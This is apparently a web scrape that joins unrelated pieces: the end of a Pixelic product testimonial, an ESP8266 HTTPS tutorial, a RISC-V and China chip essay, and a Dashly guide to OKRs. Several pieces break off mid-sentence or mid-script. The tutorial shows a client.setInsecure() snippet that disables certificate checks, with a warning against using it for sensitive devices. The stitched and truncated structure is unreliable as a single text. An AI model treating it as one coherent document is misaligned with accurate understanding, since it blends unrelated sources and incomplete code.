https://blog.pixelic.io/content/images/size/w1000/2020/06/taskify.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/06/taskify.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/06/taskify.png 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>"Taskify" button on each comment on Pixelic converts respective comments into tasks</figcaption></figure><p>Traditionally, teams switch between communication apps (e.g., Slack) and task management apps (e.g., Jira, Notion, etc.) to go back and forth, discussing and adding tasks. Pixelic converges them together so that you can instantly flip the switch to “taskify” a comment.</p><figure><img src="https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1000w, https://blog.pixelic.io/content/images/2020/06/1_q8SiG2je4mdAT3AOo5qeCA--1-.png 1400w" sizes="(min-width: 1200px) 1200px"><figcaption>Switching back and forth Slack and Notion to manage feedback and tasks at the same time is cumbersome.</figcaption></figure><p>Pixelic also has built-in version control for each Figma frame.

This is different from what you see in Notion or Jira, Pixelic’s Figma integration imports actual Figma frames into the tool for you.</p><figure><img src="https://blog.pixelic.io/content/images/2020/07/task-comments.png" alt="" srcset="https://blog.pixelic.io/content/images/size/w600/2020/07/task-comments.png 600w, https://blog.pixelic.io/content/images/size/w1000/2020/07/task-comments.png 1000w, https://blog.pixelic.io/content/images/size/w1600/2020/07/task-comments.png 1600w, https://blog.pixelic.io/content/images/size/w2400/2020/07/task-comments.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Figma frame comments are always connected with tasks bi-directionally.</figcaption></figure><p>This has two key benefits: (1) anyone can understand the context behind the task without asking others, and (2) view relevant Figma frames, or user flows without logging into Figma.</p><p>Engineers and product managers can access relevant UIs connected to each task and quickly understand the task.</p><p>Adding links, screenshots, and descriptions to each task on Jira or Asana is cumbersome if you have to do them every time. In Pixelic, since Figma frames are connected to each task, there’s no need to copy/paste links or screenshots.</p><blockquote>“What if we allow our users to sign up directly from the <strong>home screen</strong>?”</blockquote><p>Let’s say your colleague suggested above during a product meeting. How many of your team would think of the same screen? Was it the landing page? Sign up page? Main application page?</p><p>Without a shared understanding of the product, it’s challenging to communicate, and often people would have to elaborate with more details.</p><p>It’s too hard for people to see the forest through the trees, so to speak. Without the interface, people will think of different representations of the product. It’s just not an effective way to collaborate.</p><blockquote>“This wasn’t what I thought of.”<br>– said every stakeholder 🙄</blockquote><p>Driving shared understanding is crucial to make your workflow productive. Too often, teams revert back to ideation because they failed to align on the same page.</p><p>From my experience working at various startups as a product designer, what worked was communicating visually.</p><p>Visual communication saves not only the presenter’s time but also the audience because they can see what you’re seeing.

And remote collaboration via video conferencing now became the norm since COVID-19.</p><p>Pixelic helped us see the visuals (interface) as well as comments next to them while video conferencing. In Pixelic, you can click &amp; drag specific areas of the image and comment on them. This helped us to store everything so we could always go back to them later.</p><h2 id="in-conclusion">In Conclusion</h2><p>Yes, adding a tool to your already tool stack isn’t the most exciting thing for your team. But if the new tool replaces or complements your current stack to enhance team productivity, it’s a no brainer to adopt it.</p><p>Pixelic was a no brainer for us. Through Pixelic, we were able to enhance our team productivity. It helped us build a clear, shared understanding of our product across the team. And managing design projects were super easy and convenient thanks to its seamless integration with Figma.</p><p>There are some features that Pixelic still needs to add to replace our entire design collaboration tool stack, but ever since we started using Pixelic, its founders moved fast to add new fixes and updates every week.</p><p>The founders have been super supportive of any questions or requests we had. We’re excited to partner with the Pixelic team to build an optimal tool for software teams.</p><hr><p><em>Jieun is a product designer based in Seoul, South Korea.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Fetching or posting data to the internet is one of the core tasks of an IoT device. Doing so over HTTP is implemented quite well in the default ESP8266 Arduino libraries, but for HTTPS requests things are more difficult. In this post I will discuss the most common approaches used by the community, and develop my own method to do arbitrary HTTPS requests in a secure way. This method will not require any specific certificates or fingerprints to be manually coded in the application.</p><p>HTTPS if a method to do a HTTP request over a TLS (formerly SSL) connection. By doing so, the data that is sent back and forth between your computer and the server is encrypted and protected. The good news is that this protocol can be used with the ESP8266 with the <span>WiFiClientSecure</span> class. The bad news is that the common methods to do so have some big disadvantages.</p><p>First I will show the two most common approaches, and next I will describe a generic solution to their problems.</p><h3>A word about certificates</h3><p>Before diving into the details I will briefly explain the basic principles of secure HTTPS requests in layman's terms.</p><p>Basically, every website has a certificate. This certificate is issued by somebody, who is called a certification authority (CA). Each CA certificate can be issued by another CA which leads to the so called certificate chain. In the picture the chain is 3 certificates long, but in reality the length of the chain can be anything.</p><p>A certificate chain. Image from Wikipedia</p><p>The top level certificate is called a root certificate. This certificate is self-signed, which means that it can be trusted inherently. This is because only a few organisations can issue root certificates, and these are trusted to not offer fake or wrong certificates.</p><p>When you do a HTTPS request to a website from your browser, the browser will look at the certificate for the website, and validating if the certificate is indeed issued by its parent. This can be done because each certificate is signed with the private key of the upstream certificate. An explanation for dummies on public and private keys work can be found <a href="https://medium.com/@vrypan/explaining-public-key-cryptography-to-non-geeks-f0994b3c2d5" target="_blank" rel="noopener noreferrer">here<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>.</p><p>When it is verified that the certificate is indeed issued by a trusted root CA issuer, it is verified that the domain in the certicate is the same as the actual domain. If that is true, we know that the server is who it claims to be, and a secure connection can be started . </p><p>These trusted root certificates are actually stored as part of your browser to be able to validate all other certificates. Each OS or browser stores a slightly different set of roughly 100-200 root certificates, which it knows can be trusted. This is called a certificate store, and this is exactly what I will apply on the ESP8266 later in this article. But first, let's start with the two most popular other approaches.</p><h3>Fingerprints - secure but annoying</h3><p>The method that is proposed in the official ESP8266 Arduino <a href="https://arduino-esp8266.readthedocs.io/en/latest/esp8266wifi/client-secure-examples.html" target="_blank" rel="noopener noreferrer">documentation<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a> is to extract the fingerprint of a site's certificate and store this in the code. The fingerprint is a hash of the certificate. Because it is very unlikely that a second certificate exists with the same hash, we know the website can be trusted if the hash is the same as the one we store.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
const char<span>*</span> fingerpr <span>=</span> <span>"CF 05 98 89 CA FF 8E D8 5E 5C E0 C2 E4 F7 E6 C3 C7 50 DD 5C"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>

<span>if</span> <span>(</span>client<span>.</span><span>verify</span><span>(</span>fingerpr<span>,</span> host<span>)</span><span>)</span> 
<span>{</span>  
    http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

    <span>String</span> payload<span>;</span>
    <span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
        payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
<span>}</span>
<span>else</span> 
<span>{</span>
  <span>Serial</span><span>.</span><span>println</span><span>(</span><span>"certificate doesn't match"</span><span>)</span><span>;</span>
<span>}</span></code></pre><p>This approach is simple because the certificate chain does not need to be validated, but has two main issues for me:</p><ol><li>The fingerprint needs to be extracted and stored manually for each page the ESP8266 needs to connect to.</li><li>An even bigger issue is that these fingerprints change roughly once a year when the certificate expires. This means that your program can break at any time and you manually need to update the fingerprint in your code.</li></ol><h3>client.setInsecure() - easy but unsafe</h3><p>You could argue that secure connections are overkill for your application. I would be the first to admit that I prefer a pragmatic solution where possible. Imagine that all you want to do with your ESP8266 is to fetch the weather from the internet and display it in some form. Personally I would not mind to do this in an insecure way, since there are no real dangers.</p><p>But imagine the ESP8266 is controlling the lock on your door or a 3D printer which can heat up and catch on fire. Or think of the case where you are transfering personal information to or from some site or API. In these cases it is better to be safe than sorry, and the method in this section should not be used. Nevertheless, I will show it here:</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>setInsecure</span><span>(</span><span>)</span><span>;</span> <span>//the magic line, use with caution</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>
  
http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
</code></pre><p>So basically all you need to do is to add <span>client.setInsecure()</span> to your code and it will start the connection without validating the certificate. </p><h3>HTTPS requests with the IoT framework</h3><p>With that out of the way, we finally get to the implementation I have chosen instead for my ESP8266 IoT Framework, which is placed in the <span>fetch</span> class.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>            

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>fetch<span>.</span><span>GET</span><span>(</span>host<span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    

fetch<span>.</span><span>clean</span><span>(</span><span>)</span><span>;</span>
</code></pre><p>Looks easy enough doesn't it ? So what happens behind the scenes? </p><p>Basically the same thing as in a typical Browser. The ESP8266 contains a full store of all the trusted root certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> memory. This takes roughly ~170 kB of flash memory at the moment, which in my case can easily be missed. This certificate store is generated automatically on building the sofware, no manual steps required. This also means that you can do secure HTTPS requests to any URL (so you could even configure or change a URL after the build).</p><p>You might think, but hey! These certificates will expire too. And this is true. The only difference with the fingerprints is that the validity of root certificates is much longer, and can be over 20 years. Whereas the fingerprint for some services can change every few months.</p><p>As a starting point I found a great but hidden example in the ESP8266 Arduino <a href="https://github.com/esp8266/Arduino/tree/master/libraries/ESP8266WiFi/examples/BearSSL_CertStore" target="_blank" rel="noopener noreferrer">repo<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>. This example contains a Python script that gets all the certificates from the Mozilla root certificate store and stores them as files. These files will then be uploaded to the <abbr title="SPIFFS is an abbreviation for 'Serial Peripheral Interface Flash File System', which is a way to store files on embedded systems.">SPIFFS</abbr> and used during HTTPS requests. I adapted this example to be able to store the certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> instead.</p><h3>Generating a certificate store</h3><p>When a request is started, the <span>certStore</span> class will compare the hash of the certificate issuer with all the hashes of the stored root certificates. If there is a match, the correctness of the domain and other properties will be checked and the connection will be initialized.</p><p>In the default Arduino example these hashes for the stored certificates are generated in the <span>certStore</span> class. It seems more logical to me to do this directly in the Python script to save computing time on the ESP8266, so thats where I moved it. Furthermore I adapted the <span>certStore</span> class (<a href="https://github.com/maakbaas/esp8266-iot-framework/blob/master/src/certStore.cpp" target="_blank" rel="noopener noreferrer">GitHub<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>) to read the information from my <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> variables rather than the file system. </p><p>The final Python script to generate the certificate store is shown below.</p><pre><code><span>from</span> __future__ <span>import</span> print_function

            <section>
                <div>
                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

<p>In this article, we’ll tell you what the OKR concept implies and how to start adhering to it.</p>


<div>
  <p>
    When we grew from 10 to 30 people, we got to thinking we became defocused and asynchronous. One part of the team didn’t know what another one was doing; we were playing the Chinese whispers feeling we were heading separate ways. That’s exactly when we decided to adhere to OKR and we still do so.   </p>

  
</div>




<p>Many companies face the same problem, and the OKR framework helps tackle the issue, namely sync people up and help them move in the same direction while meeting their objectives. We’ve got some experience to tell you how you can implement OKR and why no one can do this right the first time (which is completely normal).</p>



<p>To make this article more insightful, we’ve talked to Ilya, a product &amp; strategy thinking mentor, and discovered his experience in implementing OKR in different companies.</p>



<p>Grab your pen and some paper and make notes on the OKR implementation as you read this article.&nbsp;</p>




<h2 id="what-is-the-okr">What is the OKR?</h2>



<p><strong>OKR (objectives and key results)</strong> is a goal-setting framework helping you determine the direction of your company’s growth, sync teams up, and engage all employees in the process of setting objectives and defining key results.&nbsp;</p>



<p>The objectives are set at these levels:</p>



<ul><li>company,</li><li>teams,</li><li>particular employees.</li></ul>



<p>Objectives are then decomposed into measurable results the company wants to achieve. The objective is marked as achieved if a certain result is met.</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg" alt="mission strategy key results tasks" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg"></figure>



<p>OKRs first appeared in Intel and then moved to Google. Now many high profile companies like Spotify, Twitter, Airbnb, and Miro use them. It doesn’t mean OKRs can only be applied in the IT universe. You can use them anywhere! Even when planning your own life. I mean it.&nbsp;</p>



<p>For example, my objective for the next 2 years is to learn French. My key results are to pass DALF for C1 and have 10 Tinder matches with native speakers.&nbsp;</p>



<p>The major thing about OKR is that both top management and the whole company are involved in defining objectives and key results. That’s why OKRs help you sync up with your team, move in the same direction, and increase the involvement of each team member as everyone knows how they can influence the achievement of a common objective.&nbsp;</p>




<h2 id="what-makes-okrs-so-great">What makes OKRs so great?</h2>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg" alt="what makes OKR great" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg"></figure>



<p><strong>Transparency:</strong> to make sure OKRs work for good, the company should be 100% transparent for its employees. That’s the only way you can encourage the team to perform great. Every employee should have access to OKRs.</p>



<p><strong>Simplicity:</strong> OKRs are easy to use and understand. Any person opening the OKR spreadsheet can easily get what it’s saying.</p>



<p><strong>Flexibility:</strong> OKRs can be set for any term from a month to several years. This helps you set the pace of the company’s development and adjust to the environment quickly.</p>



<p><strong>Two-way goal-setting:</strong> OKRs are not set for teams by the top management. They can draw up the OKRs, but then they should pass them on to teams so that they can edit and adjust the OKRs. And there can be several iterations.</p>



<p><strong>Inspiring goals:</strong><strong> </strong>within the OKR concept, objectives should be ambitious and catchy. Inspiring objectives encourage the team to achieve better results. However, the OKR assumes that you can’t achieve 100% of your objectives and that’s completely okay.</p>



<p><strong>An OKR isn’t a KPI:</strong> The OKR concept doesn’t have an incentive system for achieving objectives. Non-monetary motivation establishes a welcoming environment. So, employees are willing to generate ambitious ideas and have no fear of not meeting the targets.&nbsp;</p>


<div>
  <p>
    An OKR isn’t a KPI. There’s no cash bonus for meeting the OKR. The concept is different, and that’s cool. An OKR isn’t something that should be 100% achieved. If we achieve 100% of our OKRs, it means our objectives were not ambitious enough. And vice versa, if we only achieved 30% of our OKRs, it means we’ve set the bar too high. Meeting around 70% of OKRs says we’re doing a great job.  </p>

  
</div>





<h2 id="objectives-key-results-and-initiatives">Objectives, key results, and initiatives</h2>



<p>How do we define Objectives and Key Results (KR)? John Doerr’s formula helps you get the difference between these two.<a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/John_Doerr" target="_blank" rel="noreferrer noopener"> John Doerr</a> is the person who invented OKR and shared his knowledge with Google. Here’s his formula:</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg" alt="i will be as measured by" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg"></figure>



<p>Within the concept, the objective setting is based on its definition and our perception of an achieved objective. The objective should describe the target, and the key results are the parameters we will use to know if we have met the objective. Let’s look closer at the formula:&nbsp;</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg" alt="i will be happy in case" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg"></figure>



<p>Key results are an equally important part of the formula. They are decisive in whether an objective has been met or not.</p>



<p>Another way to understand KRs is to ask the question: “If our goal is X, what will success look like?”</p>


<div>
  <p>
    The OKR has an objective that may sound obscure in terms of the result, but it’s powerful and appealing. The second part is the key result, most often it’s a specific metric. The key result shows whether the objective has been met or not. If the goal is inspiring, then the KR reflects reality.  </p>

  
</div>




<h3><strong>What should be the objectives?</strong></h3>



<p><strong>Objectives </strong>are catchy qualitative descriptions of what we want to achieve. Objectives should be concise, ambitious, inspiring, and engaging. They must encourage and challenge the team. In this case, the whole company will have a better chance of achieving greater success.</p>



<h3><strong>What are the “key results”?</strong></h3>



<p><strong>Key results </strong>are a set of parameters that we use to assess how close we have gotten to our objective. Each objective usually involves between 3 to 5 KRs. If you pick more, the teams will find it hard to stay focused. Key results must be quantitative and measurable.</p>



<p>There are 2 kinds of key results:</p>



<ul><li><strong>Key action-driven result.</strong> Success is measured in completed/not completed projects.</li><li><strong>Key value-driven result.</strong> Success is measured in the value that the company or customers obtain.</li></ul>



<p>Here are some results of key action-driven results:</p>



<ul><li>the chatbot launch</li><li>an online course launching</li><li>the OKR book release</li></ul>



<p>Below are some key value-driven results:</p>



<ul><li>increasing the MRR from X to Y;</li><li>decreasing the Churn rate from X to Y;</li><li>increasing the ER from X to Y;</li><li>maintaining the CAC at around X.</li></ul>



<p>Take a look at the table of key action-driven results and their value equivalents:</p>



<div><figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg" alt="key action-driven results and key value-driven results" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg"></figure></div>



<p>Key action-driven results are highly likely to fail in leading you to an objective. The release of a new feature is not a success guarantee. That’s why OKRs have to be value-driven. Only then can they be as effective as possible.&nbsp;</p>



<p>Key results should reflect the value to the company or its customers. Teams will be focused on achieving greater success and there’ll be more room for creativity. The employees won’t be stuck on a particular activity but will look for different ways to achieve the objective.&nbsp;</p>



<p>But if you’re implementing the concept for the first time, it makes more sense to choose actions as key results. They will help you to switch to OKR:</p>



<p>Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics.</p>


<div>
  <p>
    Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics. First, it’s a good idea to put a set of actions in KRs that we have to perform to get closer to the objective: release a huge feature or a marketing campaign. By the end of the OKR term, you’ll be able to evaluate the success based on the done/not done principle. Another very important point is to only include metrics that we know how to calculate in KRs.   </p>

  
</div>




<h3>How we did it at Dashly</h3>



<p>Last year, the goal for OKR in Dashly was to double the number of active users. It’s a catchy and quite ambitious goal, isn’t it?&nbsp;</p>



<p>How do we know if we’ve achieved it or not? We’ve chosen key metric-based results and we’ve put all our effort to reach them and evaluate our success using them.</p>



<p>If objectives are about ambitions, key results must be clear and precise.&nbsp;</p>



<p>The key results for the “doubling” target could be the following:</p>



